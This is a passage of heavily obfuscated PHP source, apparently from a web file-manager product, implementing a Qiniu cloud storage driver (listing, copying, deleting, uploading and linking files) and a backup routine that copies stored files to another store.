"\x30"; public $ioFileOutServer = "\x30"; public function __construct($ˆ®Í×‹à) { parent::__construct(); require_once SDK_DIR . $_SERVER[ĞÆÏ¡Îª][1416]; $this->_init($ˆ®Í×‹à); } public function _init($íƒÃñø®) { $ì±£Üƒ =& $_SERVER[ĞÆÏ¡Îª]; foreach ($íƒÃñø® as $ƒÖĞ€»ò => $ì³¼·›«) { if (isset($this->{$ƒÖĞ€»ò})) { $this->{$ƒÖĞ€»ò} = $ì³¼·›«; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($ì±£Üƒ[1417] . LNG($ì±£Üƒ[1375])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($Óç¡¶ÅÎ, $îÊÍ×»Í = '', $—×ãºğª = REPEAT_RENAME) { if ($this->setContent($Óç¡¶ÅÎ, $îÊÍ×»Í)) { return $this->getPathOuter($Óç¡¶ÅÎ); } return !1; } public function mkdir($ãÃúÉ×ø, $àêĞ–úó = REPEAT_SKIP) { $Á¾›Êóø =& $_SERVER[ĞÆÏ¡Îª]; $ÉÜÜÀğĞ = trim($ãÃúÉ×ø, $Á¾›Êóø[8]); if ($this->_isFolder($ÉÜÜÀğĞ)) { return $this->getPathOuter($ÉÜÜÀğĞ); } $ãÃúÉ×ø = $ÉÜÜÀğĞ . $Á¾›Êóø[8]; $£í°ü¯¥ = get_path_this($ÉÜÜÀğĞ); $•Õ€³¥ = $ãÃúÉ×ø . $£í°ü¯¥; if (!$this->mkfile($•Õ€³¥)) { return !1; } if (!$this->moveFile($•Õ€³¥, $ãÃúÉ×ø)) { $this->delFile($•Õ€³¥); return !1; } return $this->getPathOuter($ÉÜÜÀğĞ); } public function copyFile($Å ¹ÏÃ¼, $˜À¤¢¡ó) { $åƒÈĞø¼ = $this->bucketManager->copy($this->bucket, $Å ¹ÏÃ¼, $this->bucket, $˜À¤¢¡ó, !0); return $åƒÈĞø¼ ? !1 : $this->getPathOuter($˜À¤¢¡ó); } public function moveFile($›§–Œéè, $üàíÎ—£) { $¤§Ã¤¡Ö = $this->bucketManager->move($this->bucket, $›§–Œéè, $this->bucket, $üàíÎ—£, !0); return $¤§Ã¤¡Ö ? !1 : $this->getPathOuter($üàíÎ—£); } public function delFile($›×àÇË) { if (!$this->exist($›×àÇË)) { return !0; } $„õœ®Ë‘ = $this->bucketManager->delete($this->bucket, $›×àÇË); return $„õœ®Ë‘ ? !1 : !0; } public function delFolder($š…›Ö©„) { $°ÔÇØ¨ =& $_SERVER[ĞÆÏ¡Îª]; if (!$this->exist($š…›Ö©„)) { return !0; } $this->listItemCache = !1; $Úéºë€ = $this->fileList($š…›Ö©„); $this->listItemCache = !0; $ØéÓÙ÷± = trim($š…›Ö©„, $°ÔÇØ¨[8]) . $°ÔÇØ¨[8]; if (!empty($š…›Ö©„) && $š…›Ö©„ !== $°ÔÇØ¨[197] && !in_array($ØéÓÙ÷±, $Úéºë€[$°ÔÇØ¨[82]])) { $Úéºë€[$°ÔÇØ¨[82]][] = $ØéÓÙ÷±; } $Â´Ö‡ã« = $this->delByBatch($Úéºë€[$°ÔÇØ¨[83]]); if (!$Â´Ö‡ã«) { return !1; } $Â´Ö‡ã« = $this->delByBatch($Úéºë€[$°ÔÇØ¨[82]]); if (!$Â´Ö‡ã«) { return !1; } return $this->delFile($ØéÓÙ÷±); } private function delByBatch($ƒ®±ŒË¿) { foreach (array_chunk($ƒ®±ŒË¿, 1000) as $Ûˆç¡µĞ) { $å­­Õµğ = $this->bucketManager->buildBatchDelete($this->bucket, $Ûˆç¡µĞ); list($ßœš²ı, $‘ÔÇàÑ) = $this->bucketManager->batch($å­­Õµğ); if ($‘ÔÇàÑ) { return !1; } } return !0; } public function rename($–ÖÖ˜™Ü, $î†è†Ÿ) { return $this->renameObject($–ÖÖ˜™Ü, $î†è†Ÿ); } public function fileInfo($Ü£úœş, $êÚ»îı = false, $ÓÉâ¿Ê = array()) { $ûĞô¢±“ =& $_SERVER[ĞÆÏ¡Îª]; $æ°¾‰ƒş = array($ûĞô¢±“[32] => $this->pathThis($Ü£úœş), $ûĞô¢±“[84] => $this->getPathOuter($ûĞô¢±“[8] . $Ü£úœş), $ûĞô¢±“[33] => $ûĞô¢±“[199], $ûĞô¢±“[76] => isset($ÓÉâ¿Ê[$ûĞô¢±“[1418]]) ? $ÓÉâ¿Ê[$ûĞô¢±“[1418]] : 0, $ûĞô¢±“[174] => $this->ext($Ü£úœş)); if ($êÚ»îı) { return $æ°¾‰ƒş; } $æ°¾‰ƒş[$ûĞô¢±“[200]] = $æ°¾‰ƒş[$ûĞô¢±“[85]] = 0; $æ°¾‰ƒş[$ûĞô¢±“[201]] = $æ°¾‰ƒş[$ûĞô¢±“[202]] = !0; if (empty($ÓÉâ¿Ê)) { $ÓÉâ¿Ê = $this->objectMeta($Ü£úœş); if (!$ÓÉâ¿Ê) { return $æ°¾‰ƒş; } } if (isset($ÓÉâ¿Ê[$ûĞô¢±“[1419]])) { $æ°¾‰ƒş[$ûĞô¢±“[85]] = substr($ÓÉâ¿Ê[$ûĞô¢±“[1419]] . $ûĞô¢±“[12], 0, 10); } if (isset($ÓÉâ¿Ê[$ûĞô¢±“[1418]])) { $æ°¾‰ƒş[$ûĞô¢±“[76]] = $ÓÉâ¿Ê[$ûĞô¢±“[1418]]; } return $æ°¾‰ƒş; } public function folderInfo($¨ú«˜Ÿø, $›¶ÙÙ‡¹ = false) { $§ßŞ¾§ =& $_SERVER[ĞÆÏ¡Îª]; $Ö€ş¾¡á = array($§ßŞ¾§[32] => $this->pathThis($¨ú«˜Ÿø), $§ßŞ¾§[84] => $this->getPathOuter($§ßŞ¾§[8] . $¨ú«˜Ÿø), $§ßŞ¾§[33] => $§ßŞ¾§[75]); if ($›¶ÙÙ‡¹) { return $Ö€ş¾¡á; } $Ö€ş¾¡á[$§ßŞ¾§[200]] = $Ö€ş¾¡á[$§ßŞ¾§[85]] = 0; $Ö€ş¾¡á[$§ßŞ¾§[201]] = $Ö€ş¾¡á[$§ßŞ¾§[202]] = !0; $¨ú«˜Ÿø = rtrim($¨ú«˜Ÿø, $§ßŞ¾§[8]) . $§ßŞ¾§[8]; $¨Ô„Ó™’ = $this->objectMeta($¨ú«˜Ÿø); if (isset($¨Ô„Ó™’[$§ßŞ¾§[1419]])) { $Ö€ş¾¡á[$§ßŞ¾§[85]] = substr($¨Ô„Ó™’[$§ßŞ¾§[1419]] . $§ßŞ¾§[12], 0, 10); } return $Ö€ş¾¡á; } public function listPath($è´¶€ï, $úº¼Ğîä = false) { $ŒÛêÜ“ü =& $_SERVER[ĞÆÏ¡Îª]; $ËëÔ÷» = $this->fileList($è´¶€ï, $ŒÛêÜ“ü[8], !0); foreach ($ËëÔ÷»[$ŒÛêÜ“ü[82]] as $ˆî‡ú° => $èšÙîî¼) { $ËëÔ÷»[$ŒÛêÜ“ü[82]][$ˆî‡ú°] = $this->folderInfo($èšÙîî¼, $úº¼Ğîä); } foreach ($ËëÔ÷»[$ŒÛêÜ“ü[83]] as $ˆî‡ú° => $èšÙîî¼) { $ËëÔ÷»[$ŒÛêÜ“ü[83]][$ˆî‡ú°] = $this->fileInfo($èšÙîî¼[$ŒÛêÜ“ü[94]], $úº¼Ğîä, $èšÙîî¼); } return $ËëÔ÷»; } public function has($§äìÙºû, $Ìâç«İ¦ = false, $Ò‰¬İÈ = true) { $ëÍœÂ‰ù =& $_SERVER[ĞÆÏ¡Îª]; $§äìÙºû = trim($§äìÙºû, $ëÍœÂ‰ù[8]); $§ñÁ“Ù€ = empty($§äìÙºû) && $§äìÙºû !== $ëÍœÂ‰ù[197] ? $ëÍœÂ‰ù[12] : $§äìÙºû . $ëÍœÂ‰ù[8]; $™¼¢šú‰ = $ëÍœÂ‰ù[12]; $–ôÁ‘¨ = 500; $àº ùÁ¦ = $ëÍœÂ‰ù[8]; $ï¸Ìû¤ƒ = $Ş¤—ÑÌÙ = 0; while (!0) { check_abort(); list($¹Õ‹‰³•, $Ùôâ¦ÎÒ) = $this->bucketManager->listFiles($this->bucket, $§ñÁ“Ù€, $™¼¢šú‰, $–ôÁ‘¨, $àº ùÁ¦); if ($Ùôâ¦ÎÒ) { break; } $™¼¢šú‰ = array_key_exists($ëÍœÂ‰ù[1387], $¹Õ‹‰³•) ? $™¼¢šú‰ = $¹Õ‹‰³•[$ëÍœÂ‰ù[1420]] : $ëÍœÂ‰ù[12]; if ($Ìâç«İ¦) { if (!empty($¹Õ‹‰³•[$ëÍœÂ‰ù[1421]])) { $ï¸Ìû¤ƒ += count($¹Õ‹‰³•[$ëÍœÂ‰ù[1421]]); } if (!empty($¹Õ‹‰³•[$ëÍœÂ‰ù[1422]])) { $Ş¤—ÑÌÙ += count($¹Õ‹‰³•[$ëÍœÂ‰ù[1422]]); } if ($™¼¢šú‰ === $ëÍœÂ‰ù[12]) { break; } continue; } if ($Ò‰¬İÈ) { if (!empty($¹Õ‹‰³•[$ëÍœÂ‰ù[1421]])) { return !0; } } else { if (!empty($¹Õ‹‰³•[$ëÍœÂ‰ù[1422]])) { return !0; } } if ($™¼¢šú‰ === $ëÍœÂ‰ù[12]) { break; } } if ($Ìâç«İ¦) { return array($ëÍœÂ‰ù[207] => $ï¸Ìû¤ƒ, $ëÍœÂ‰ù[208] => $Ş¤—ÑÌÙ); } return !1; } public function listAll($Ø¿“ï¦) { $Œœ¬Äî =& $_SERVER[ĞÆÏ¡Îª]; $ìì„ºÁË = $this->fileList($Ø¿“ï¦, $Œœ¬Äî[12], !0); $åãù÷Û· = array(); foreach ($ìì„ºÁË[$Œœ¬Äî[83]] as $îğ”¯Í) { $åãù÷Û·[$îğ”¯Í[$Œœ¬Äî[94]]] = $îğ”¯Í[$Œœ¬Äî[76]]; } foreach ($ìì„ºÁË[$Œœ¬Äî[82]] as $îğ”¯Í) { if (is_string($îğ”¯Í)) { $åãù÷Û·[$îğ”¯Í] = 0; } } return $this->listAllFiles($Ø¿“ï¦, array_keys($åãù÷Û·), $åãù÷Û·); } private function fileList($Œ”«ÖüÊ, $ğ‡È¿ ï = '', $¿’–­Óõ = 0) { $ ñ€æ±î =& $_SERVER[ĞÆÏ¡Îª]; $Œ”«ÖüÊ = trim($Œ”«ÖüÊ, $ ñ€æ±î[8]); $©«Í÷øË = empty($Œ”«ÖüÊ) && $Œ”«ÖüÊ !== $ ñ€æ±î[197] ? $ ñ€æ±î[12] : $Œ”«ÖüÊ . $ ñ€æ±î[8]; $’Ä¸ÕÀ‚ = $ ñ€æ±î[12]; $‡˜İÔæİ = 1000; $Ãâ‘Ôé’ = $ù¬ÙË¦Ú = array(); while (!0) { check_abort(); list($¹ĞÈèá¯, $¹‘Ãûâ) = $this->bucketManager->listFiles($this->bucket, $©«Í÷øË, $’Ä¸ÕÀ‚, $‡˜İÔæİ, $ğ‡È¿ ï); if ($¹‘Ãûâ) { break; } $’Ä¸ÕÀ‚ = array_key_exists($ ñ€æ±î[1387], $¹ĞÈèá¯) ? $’Ä¸ÕÀ‚ = $¹ĞÈèá¯[$ ñ€æ±î[1420]] : $ ñ€æ±î[12]; $‰ë©‘ø = isset($¹ĞÈèá¯[$ ñ€æ±î[1421]]) ? $¹ĞÈèá¯[$ ñ€æ±î[1421]] : array(); $Óö²’€¶ = isset($¹ĞÈèá¯[$ ñ€æ±î[1422]]) ? $¹ĞÈèá¯[$ ñ€æ±î[1422]] : array(); foreach ($‰ë©‘ø as $åïßøÅ‚) { if ($åïßøÅ‚[$ ñ€æ±î[94]] == $©«Í÷øË) { continue; } $÷áÛŸÑ  = $åïßøÅ‚[$ ñ€æ±î[94]]; $ö˜ÔÙ¤“ = $åïßøÅ‚[$ ñ€æ±î[1418]]; $åïßøÅ‚[$ ñ€æ±î[76]] = $ö˜ÔÙ¤“; $‡¨ƒ¾¾Í = $ö˜ÔÙ¤“ == 0 && substr($÷áÛŸÑ , strlen($÷áÛŸÑ ) - 1, 1) == $ ñ€æ±î[8] ? !0 : !1; $this->cacheMethodInfoSet($÷áÛŸÑ , $‡¨ƒ¾¾Í, $åïßøÅ‚); if ($‡¨ƒ¾¾Í) { $Ãâ‘Ôé’[] = $÷áÛŸÑ ; continue; } $ù¬ÙË¦Ú[] = $¿’–­Óõ ? $åïßøÅ‚ : $÷áÛŸÑ ; } foreach ($Óö²’€¶ as $÷áÛŸÑ ) { if ($÷áÛŸÑ  == $©«Í÷øË) { continue; } $Ãâ‘Ôé’[] = $÷áÛŸÑ ; $this->cacheMethodInfoSet($÷áÛŸÑ , !0); } if ($’Ä¸ÕÀ‚ === $ ñ€æ±î[12]) { break; } } $this->cacheMethodInfoSet($Œ”«ÖüÊ, !0); return array($ ñ€æ±î[82] => $Ãâ‘Ôé’, $ ñ€æ±î[83] => $ù¬ÙË¦Ú); } public function canRead($êó¹´ò¼) { return $this->exist($êó¹´ò¼) ? !0 : !1; } public function canWrite($Şî£ÖÏ) { return $this->exist($Şî£ÖÏ) ? !0 : !1; } public function getContent($Æãçó”†) { return $this->fileSubstr($Æãçó”†, 0, -1); } public function setContent($¸´ò’¢â, $Ø¾ÏÁĞ = '') { $ˆ’ƒ¡šˆ = $this->tempFile($this->pathThis($¸´ò’¢â)); file_put_contents($ˆ’ƒ¡šˆ, $Ø¾ÏÁĞ); if ($this->upload($¸´ò’¢â, $ˆ’ƒ¡šˆ)) { $this->tempFileRemve($ˆ’ƒ¡šˆ); return !0; } return !1; } public function refreshUrls($Ú›™óŠ¢) { $ŒÈÀ‡òî =& $_SERVER[ĞÆÏ¡Îª]; $Æûó×Áè = array(); if (is_array($Ú›™óŠ¢)) { foreach ($Ú›™óŠ¢ as $êã²ÉŞŸ) { $Æûó×Áè[] = $this->link($êã²ÉŞŸ); } } else { $Æûó×Áè[] = $this->link($Ú›™óŠ¢); } $‰¹çÊœò = new Qiniu\Cdn\CdnManager($this->auth); list($ÕÒ¬òğı, $´€ñŸ‹´) = $‰¹çÊœò->refreshUrls($Æûó×Áè); if ($´€ñŸ‹´) { return !1; } return $ÕÒ¬òğı[$ŒÈÀ‡òî[1174]] == $ŒÈÀ‡òî[755] ? !0 : !1; } public function fileSubstr($Úİù¹¯ø, $ƒïÇîİ, $ÏÙÓÕ­ğ) { $‰×øîÎã =& $_SERVER[ĞÆÏ¡Îª]; if (!($¿æñßÂ = $this->link($Úİù¹¯ø))) { return !1; } $û¡«¿ğ = !1; if ($ÏÙÓÕ­ğ > 0) { $ Ø–ÇÅ‹ = $ƒïÇîİ + $ÏÙÓÕ­ğ - 1; $û¡«¿ğ = array($‰×øîÎã[1423] . $ƒïÇîİ . $‰×øîÎã[394] . $ Ø–ÇÅ‹); } $êöŒà…ó = url_request($¿æñßÂ, $‰×øîÎã[230], !1, $û¡«¿ğ); return $êöŒà…ó[$‰×øîÎã[745]] ? $êöŒà…ó[$‰×øîÎã[1184]] : !1; } public function upload($Ìƒ­‘„, $Úˆ•Ò“©, $ìû˜«Æ = false, $Ä±âö”ƒ = REPEAT_REPLACE) { $¢ãÚ¼Ù’ = new Qiniu\Storage\UploadManager(); $ û³ÊŠÏ = $this->auth->uploadToken($this->bucket, $Ìƒ­‘„); $ò×ƒİ¥ = get_file_mime(get_path_ext($Úˆ•Ò“©)); list($÷öõŒ”Ø, $·ŞöƒõÂ) = $¢ãÚ¼Ù’->putFile($ û³ÊŠÏ, $Ìƒ­‘„, $Úˆ•Ò“©, null, $ò×ƒİ¥); return $·ŞöƒõÂ ? !1 : $this->getPathOuter($Ìƒ­‘„); } public function uploadFormData($‡Í·ÇŒ½, $ ûûÅì¬ = 3600) { return $this->uploadToken($‡Í·ÇŒ½, $ ûûÅì¬); } public function multiUploadFormData($¢úàòĞÏ, $ €Öˆ = 3600) { return $this->uploadToken($¢úàòĞÏ, $ €Öˆ); } private function uploadToken($ú†Ü•ñİ, $ÓÀ¡¬œ” = 3600) { $‚³Ê¶ë× =& $_SERVER[ĞÆÏ¡Îª]; $ÎÚ‰ĞÎ« = $ÓÀ¡¬œ”; $ÊÍ€ñÃ = array($‚³Ê¶ë×[1424] => $‚³Ê¶ë×[1425]); $ó™ßÎÆ = $ú†Ü•ñİ; $ã¬ø¬Ú = $this->auth->uploadToken($this->bucket, $ó™ßÎÆ, $ÎÚ‰ĞÎ«, $ÊÍ€ñÃ, !0); $õÈÊøğÎ = empty($this->region) || $this->region == $‚³Ê¶ë×[1426] ? $‚³Ê¶ë×[12] : $‚³Ê¶ë×[394] . $this->region; $§ÇÉ¦ìŠ = http_type() . "\72\x2f\x2f\x75\160\x6c\x6f\141\x64{$õÈÊøğÎ}\56\161\x69\x6e\151\x75\160\56\x63\157\x6d\57"; return array($‚³Ê¶ë×[1427] => $ã¬ø¬Ú, $‚³Ê¶ë×[1428] => $§ÇÉ¦ìŠ); } public function download($ÉµëÆ, $¸ö“ÜÖø) { $Ï³™“¯û = IO::getPathInner(IO::mkfile($¸ö“ÜÖø)); if (!($¼®ß¾÷Û = $this->link($ÉµëÆ))) { return !1; } $âµ÷¬§î = 0; $Úû……ËŠ = 1024 * 200; $—­â’—Ä = fopen($Ï³™“¯û, $_SERVER[ĞÆÏ¡Îª][1429]); while (!0) { $ñÂ…ÓÖ = $this->fileSubstr($ÉµëÆ, $âµ÷¬§î, $Úû……ËŠ); if ($ñÂ…ÓÖ === !1) { return !1; } fwrite($—­â’—Ä, $ñÂ…ÓÖ); $âµ÷¬§î += $Úû……ËŠ; if (strlen($ñÂ…ÓÖ) < $Úû……ËŠ) { break; } } fclose($—­â’—Ä); return $¸ö“ÜÖø; } public function link($‡ëşŸøŒ, $öàîÊøø = '') { if (!$this->isFile($‡ëşŸøŒ)) { return !1; } $¾·Û×Ï‘ = $this->getHost() . $_SERVER[ĞÆÏ¡Îª][8] . $this->pathEncode($‡ëşŸøŒ) . $öàîÊøø; return $this->auth->privateDownloadUrl($¾·Û×Ï‘, 3600 * 12); } public function fileOut($™“©À¢§, $®£üĞ = false, $´‚™œÉè = false, $€šùõŒá = '') { $ò¨œŸïí =& $_SERVER[ĞÆÏ¡Îª]; if ($this->isFileOutServer()) { return $this->fileOutServer($™“©À¢§, $®£üĞ, $´‚™œÉè, $€šùõŒá); } if (!$´‚™œÉè) { $´‚™œÉè = $this->pathThis($™“©À¢§); } $–õ—ıº = $®£üĞ ? $ò¨œŸïí[1430] . rawurlencode($´‚™œÉè) : $ò¨œŸïí[12]; $í­íÃ…Õ = $this->link($™“©À¢§, $–õ—ıº); $this->fileOutLink($í­íÃ…Õ); } public function fileOutServer($Å²Ä­ø, $´ß¥³ç¤ = false, $“á†ıÀØ = false, $»û“§ŸÚ = '') { parent::fileOut($Å²Ä­ø, $´ß¥³ç¤, $“á†ıÀØ, $»û“§ŸÚ); } public function fileOutImage($‚íù«˜¦, $„­²š™Ü = 250) { $šÃîÊŸ¾ = $this->link($‚íù«˜¦, $_SERVER[ĞÆÏ¡Îª][1431] . $„­²š™Ü); $this->fileOutLink($šÃîÊŸ¾); } public function fileOutImageServer($ÊÃ´Æò, $‹¨•‘í¾ = 250) { parent::fileOutImage($ÊÃ´Æò, $‹¨•‘í¾); } public function hashMd5($ÍºÎ¦ı·) { $ÀÕÌ·” =& $_SERVER[ĞÆÏ¡Îª]; $æ„® = $this->objectMeta($ÍºÎ¦ı·); return isset($æ„®[$ÀÕÌ·”[212]]) ? $æ„®[$ÀÕÌ·”[212]] : !1; $üºïåı¹ = $this->link($ÍºÎ¦ı·, $ÀÕÌ·”[1432]); } public function size($æğóßÈ) { $£¤îÏ¬Í = $this->objectMeta($æğóßÈ); return $£¤îÏ¬Í ? $£¤îÏ¬Í[$_SERVER[ĞÆÏ¡Îª][76]] : 0; } public function info($©×ªŞªÒ) { if ($this->isFolder($©×ªŞªÒ)) { return $this->folderInfo($©×ªŞªÒ); } else { if ($this->isFile($©×ªŞªÒ)) { return $this->fileInfo($©×ªŞªÒ); } } return !1; } public function exist($§“–»ëñ) { return $this->isFile($§“–»ëñ) || $this->isFolder($§“–»ëñ); } public function isFile($øª‚¤™) { return !$this->isFolder($øª‚¤™) && $this->objectMeta($øª‚¤™); } public function isFolder($Ö£à²İ÷) { return $this->cacheMethod($_SERVER[ĞÆÏ¡Îª][165], $Ö£à²İ÷); } protected function objectMeta($Ã˜ÏûÂ™) { return $this->cacheMethod($_SERVER[ĞÆÏ¡Îª][167], $Ã˜ÏûÂ™); } protected function _objectMeta($½”æŠ„) { $šÔ×ç =& $_SERVER[ĞÆÏ¡Îª]; list($”…åÕö£, $”×£¡§û) = $this->bucketManager->stat($this->bucket, $½”æŠ„); if ($”…åÕö£) { $”…åÕö£[$šÔ×ç[76]] = intval($”…åÕö£[$šÔ×ç[1418]]); } return $”…åÕö£; } protected function _isFolder($¥Å¿•¼) { $£Û§âÅ =& $_SERVER[ĞÆÏ¡Îª]; if ($¥Å¿•¼ == $£Û§âÅ[12] || $¥Å¿•¼ == $£Û§âÅ[8]) { return !0; } list($„İñì“‘, $æ±£¤½Ô) = $this->bucketManager->listFiles($this->bucket, trim($¥Å¿•¼, $£Û§âÅ[8]) . $£Û§âÅ[8], $£Û§âÅ[12], 1, $£Û§âÅ[8]); return !empty($„İñì“‘[$£Û§âÅ[1421]]) || !empty($„İñì“‘[$£Û§âÅ[1422]]) ? !0 : !1; } } goto fÆ±Şö‡ÄÓ; BÔÊŠÜá×®: class BackupFile { public function __construct() { } public function index() { $â½®ú» = Backup::get(); $²èëÒ = $â½®ú»[$_SERVER[ĞÆÏ¡Îª][302]][$_SERVER[ĞÆÏ¡Îª][199]][$_SERVER[ĞÆÏ¡Îª][477]]; $³ïôìù = array($_SERVER[ĞÆÏ¡Îª][478] => array($_SERVER[ĞÆÏ¡Îª][802], $²èëÒ), $_SERVER[ĞÆÏ¡Îª][803] => array($_SERVER[ĞÆÏ¡Îª][340], $â½®ú»[$_SERVER[ĞÆÏ¡Îª][747]])); $±ÖÜÎ˜ = (int) Model($_SERVER[ĞÆÏ¡Îª][784])->where($³ïôìù)->count($_SERVER[ĞÆÏ¡Îª][477]); $Ä…™ıŠÚ = (int) Model($_SERVER[ĞÆÏ¡Îª][784])->where($³ïôìù)->sum($_SERVER[ĞÆÏ¡Îª][76]); $ó™öÂ­ = new TaskFileTransfer($_SERVER[ĞÆÏ¡Îª][804], $_SERVER[ĞÆÏ¡Îª][775], $±ÖÜÎ˜, LNG($_SERVER[ĞÆÏ¡Îª][776]) . $_SERVER[ĞÆÏ¡Îª][777] . LNG($_SERVER[ĞÆÏ¡Îª][805])); $ó™öÂ­->task[$_SERVER[ĞÆÏ¡Îª][758]] = $Ä…™ıŠÚ; $îÆÓ“€ã = array($_SERVER[ĞÆÏ¡Îª][806] => $±ÖÜÎ˜, $_SERVER[ĞÆÏ¡Îª][807] => $Ä…™ıŠÚ, $_SERVER[ĞÆÏ¡Îª][808] => time()); Backup::set($îÆÓ“€ã); $ıçä¹ƒÖ = !0; $ºØù‹»ß = $this->storeIds(); $¯îª¯ãœ = 1; $§Â¥±²À = 1000; $®ê‘ ¬ª = $ãÛ‚ûÀ = 0; $£‰Ôœ¿² = array(); $€¹’óö = $ Ìıôû¦ = 0; do { $¬‰²ô°ï = $_SERVER[ĞÆÏ¡Îª][809]; $ïÛ—šèÍ = Model($_SERVER[ĞÆÏ¡Îª][784])->where($³ïôìù)->field($¬‰²ô°ï)->order($_SERVER[ĞÆÏ¡Îª][810])->selectPage($§Â¥±²À, $¯îª¯ãœ); $Ô£²æ± = !empty($ïÛ—šèÍ[$_SERVER[ĞÆÏ¡Îª][378]]) ? $ïÛ—šèÍ[$_SERVER[ĞÆÏ¡Îª][378]] : array(); foreach ($Ô£²æ± as $ÄäãÓş) { if (!$this->_fileExist($ÄäãÓş, $£‰Ôœ¿², $ºØù‹»ß)) { $±ÖÜÎ˜ -= 1; $Ä…™ıŠÚ -= (int) $ÄäãÓş[$_SERVER[ĞÆÏ¡Îª][76]]; write_log("\x66\151\x6c\x65\40\156\x6f\x74\x20\x65\x78\x69\x73\x74\x2e\146\x69\x6c\x65\111\104\x3a{$ÄäãÓş[$_SERVER[ĞÆÏ¡Îª][477]]}\x2c\40\160\x61\x74\150\x3a{$ÄäãÓş[$_SERVER[ĞÆÏ¡Îª][84]]}", $_SERVER[ĞÆÏ¡Îª][811]); continue; } $À¶ˆÔšØ = $ÄäãÓş[$_SERVER[ĞÆÏ¡Îª][84]]; $ã˜«Ö™— = "\x7b\x69\x6f\x3a{$â½®ú»[$_SERVER[ĞÆÏ¡Îª][747]]}\x7d" . substr($À¶ˆÔšØ, strlen("\x7b\151\157\72{$ÄäãÓş[$_SERVER[ĞÆÏ¡Îª][812]]}\x7d")); if (IO::exist($ã˜«Ö™—)) { $ó™öÂ­->updateFileEnd($ÄäãÓş[$_SERVER[ĞÆÏ¡Îª][32]], $ÄäãÓş[$_SERVER[ĞÆÏ¡Îª][76]]); } else { $ã˜«Ö™— = get_path_father($ã˜«Ö™—); IO::mkdir($ã˜«Ö™—); if (!IO::copy($À¶ˆÔšØ, $ã˜«Ö™—, $_SERVER[ĞÆÏ¡Îª][813])) { write_log($_SERVER[ĞÆÏ¡Îª][814] . $À¶ˆÔšØ . $_SERVER[ĞÆÏ¡Îª][798] . $ã˜«Ö™— . $_SERVER[ĞÆÏ¡Îª][164], $_SERVER[ĞÆÏ¡Îª][775]); $ıçä¹ƒÖ = !1; break; } } $²èëÒ = $ÄäãÓş[$_SERVER[ĞÆÏ¡Îª][477]]; $ãÛ‚ûÀ += 1; $®ê‘ ¬ª += $ÄäãÓş[$_SERVER[ĞÆÏ¡Îª][76]]; $ Ìıôû¦ += 1; $€¹’óö += $ÄäãÓş[$_SERVER[ĞÆÏ¡Îª][76]]; if ($®ê‘ ¬ª >= 1024 * 1024 * 100) { $îÆÓ“€ã = array($_SERVER[ĞÆÏ¡Îª][815] => $²èëÒ, $_SERVER[ĞÆÏ¡Îª][816] => $ Ìıôû¦, $_SERVER[ĞÆÏ¡Îª][817] => $€¹’óö); Backup::set($îÆÓ“€ã); $®ê‘ ¬ª = $ãÛ‚ûÀ = 0; } } $ÙÉ™é¯ª = count($Ô£²æ±); $¯îª¯ãœ++; } while ($ÙÉ™é¯ª == $§Â¥±²À); $ó™öÂ­->end(); $îÆÓ“€ã = array($_SERVER[ĞÆÏ¡Îª][818] => 1, $_SERVER[ĞÆÏ¡Îª][506] => time(), $_SERVER[ĞÆÏ¡Îª][770] => 1, $_SERVER[ĞÆÏ¡Îª][815] => $²èëÒ, $_SERVER[ĞÆÏ¡Îª][807] => $Ä…™ıŠÚ, $_SERVER[ĞÆÏ¡Îª][806] => $±ÖÜÎ˜, $_SERVER[ĞÆÏ¡Îª][819] => time()); if ($ãÛ‚ûÀ) { $îÆÓ“€ã[$_SERVER[ĞÆÏ¡Îª][816]] = $ Ìıôû¦; $îÆÓ“€ã[$_SERVER[ĞÆÏ¡Îª][817]] = $€¹’óö; } Backup::set($îÆÓ“€ã); $this->_fileFilter($£‰Ôœ¿²); return !0; } private function _fileExist($‡ğ±Š´, &$ ã¨Âó, $îú£ÆÊ) { $Ã¡Á´˜´ =& $_SERVER[ĞÆÏ¡Îª]; $È£ËÂêş = $‡ğ±Š´[$Ã¡Á´˜´[84]]; if (in_array($‡ğ±Š´[$Ã¡Á´˜´[477]], $ ã¨Âó)) { return !1; } if (!in_array($‡ğ±Š´[$Ã¡Á´˜´[812]], $îú£ÆÊ)) { return !1; } if (IO::exist($È£ËÂêş)) { return !0; } $æ ªéç = get_path_father($È£ËÂêş); if (IO::exist($æ ªéç)) { $ ã¨Âó[] = $‡ğ±Š´[$Ã¡Á´˜´[477]]; return !1; } $İèÄ÷ªş = array($Ã¡Á´˜´[812] => $‡ğ±Š´[$Ã¡Á´˜´[812]], $Ã¡Á´˜´[84] => array($Ã¡Á´˜´[391], "{$æ ªéç}\x25")); $¤åèß£€ = Model($Ã¡Á´˜´[784])->where($İèÄ÷ªş)->field($Ã¡Á´˜´[478])->select(); $ ã¨Âó = array_merge($ ã¨Âó, array_to_keyvalue($¤åèß£€, $Ã¡Á´˜´[12], $Ã¡Á´˜´[477])); return !1; } private function _fileFilter($£‰—Ù°) { $İŞŠ¢èÜ =& $_SERVER[ĞÆÏ¡Îª]; if (empty($£‰—Ù°)) { return; } $€¿™¢ñŸ = array($İŞŠ¢èÜ[477] => array($İŞŠ¢èÜ[7], array_unique($£‰—Ù°))); $á§‘½Û = Model($İŞŠ¢èÜ[820])->where($€¿™¢ñŸ)->field($İŞŠ¢èÜ[411])->select(); foreach ($á§‘½Û as $ãØÁù“) { Model($İŞŠ¢èÜ[820])->remove($ãØÁù“[$İŞŠ¢èÜ[411]], !1); } } private function storeIds() { $ÇÚêáËè =& $_SERVER[ĞÆÏ¡Îª]; $¾Û€õùõ = Model($ÇÚêáËè[762])->listData(); $É‚›ûå– = array(); $¼Ê­¸Û¾ = $GLOBALS[$ÇÚêáËè[6]][$ÇÚêáËè[89]][$ÇÚêáËè[821]]; foreach ($¾Û€õùõ as $²ëÄ˜ªÂ) { $ÜåŞ¸¢ş = strtolower($²ëÄ˜ªÂ[$ÇÚêáËè[95]]); if (!isset($¼Ê­¸Û¾[$ÜåŞ¸¢ş])) { continue; } $±……“ä = $ÇÚêáËè[74] . (isset($¼Ê­¸Û¾[$ÜåŞ¸¢ş]) ? $¼Ê­¸Û¾[$ÜåŞ¸¢ş] : ucfirst($ÜåŞ¸¢ş)); if (!class_exists($±……“ä)) { continue; } $É‚›ûå–[] = 